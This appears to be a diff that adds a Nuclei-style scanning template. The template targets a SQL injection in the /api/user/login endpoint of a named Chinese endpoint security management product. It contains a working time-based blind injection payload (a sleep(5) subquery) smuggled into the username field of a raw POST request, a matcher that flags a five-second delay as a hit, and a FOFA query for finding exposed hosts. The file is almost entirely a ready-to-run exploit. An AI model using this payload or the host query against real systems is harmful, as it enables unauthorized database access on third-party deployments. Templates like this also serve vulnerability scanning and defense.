@@ -1,0 +1,35 @@
+id: poc-1d12d7c000a88fe0ce5b
+info:
+  name: 辰信景云终端安全管理系统login存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/1d12d7c000a88fe0ce5b37e5747e492a
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 1d12d7c000a88fe0ce5b37e5747e492a
+    fofa: + fofa`app="辰信领创-景云终端安全管理系统"`
+http:
+- raw:
+  - 'POST /api/user/login HTTP/2
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
+
+    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 102
+
+
+    captcha=&password=21232f297a57a5a743894a0e4a801fc3&username=admin''and(select*from(select+sleep(5))a)='''
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
